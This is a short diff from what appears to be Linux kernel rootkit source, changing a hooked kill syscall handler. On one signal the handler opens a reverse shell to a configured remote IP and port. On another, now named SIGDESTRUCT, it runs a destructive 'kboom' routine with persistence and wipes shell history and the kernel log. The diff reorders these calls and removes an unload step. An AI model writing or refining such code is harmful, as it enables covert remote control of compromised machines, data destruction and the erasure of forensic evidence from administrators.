@@ -56,13 +56,12 @@ int new_kill(const struct pt_regs *pt_regs)
             start_reverse_shell(REVERSE_SHELL_IP, REVERSE_SHELL_PORT);
             printk(KERN_INFO "CALL REV SHELL WITH SIG");
             break;
-        case TEST:
+        case SIGDESTRUCT:
             module_show();
-            kboom();
             kboom_persistence();
+            kboom();
             flush_history();
             flush_dmesg();
-            unload();
             printk(KERN_INFO "CALL SELFDESTRUCT WITH SIG");
             break;
         default:
